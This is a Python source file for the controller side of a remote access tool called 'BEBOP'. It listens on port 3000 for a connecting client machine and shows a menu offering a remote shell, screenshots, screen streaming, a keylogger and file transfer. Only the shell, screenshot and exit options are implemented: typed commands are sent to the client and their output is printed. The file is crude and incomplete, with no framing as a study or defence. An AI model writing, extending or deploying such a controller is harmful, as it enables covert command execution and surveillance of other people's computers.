import socket
import sys
import threading

def print_menu():
    print("/-------BEBOP-------/\n")
    print("1.) Open shell")
    print("2.) Take screenshot")
    print("3.) Begin screen stream")
    print("4.) Keylogger")
    print("5.) File upload/download")
    print("6.) Exit\n\n")

def establish_connection():
    global conn_to_client
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 3000))
    server.listen(0)

    print("Waiting on connections")
    conn_to_client, address = server.accept()
    
    if conn_to_client:
        print(f"Connection to {address[0]}:{address[1]} Established!")
    else:
        sys.exit("Failed to recieve connection to client...Exiting")
    

def open_shell():
    while True:
        cmd = input("bebop#: ")
        if not cmd:
            cmd = " "
        elif cmd == "exit":
            conn_to_client.sendall(cmd.encode())
            break
        conn_to_client.sendall(cmd.encode())
        output = conn_to_client.recv(4096)
        print(output.decode())
        

def recv_screenshot():
    buf = conn_to_client.recv(40960000)
    print(buf)
            
        

def main():
    establish_connection()
    while True:
        print_menu()
        choice = input("Enter Choice: ")
        if choice == "1":
            conn_to_client.sendall(b'1')
            open_shell()
        elif choice == "2":
            conn_to_client.sendall(b'2')
            recv_screenshot()
        elif choice == "6":
            conn_to_client.sendall(b'6')
            conn_to_client.close()
            sys.exit()

main()
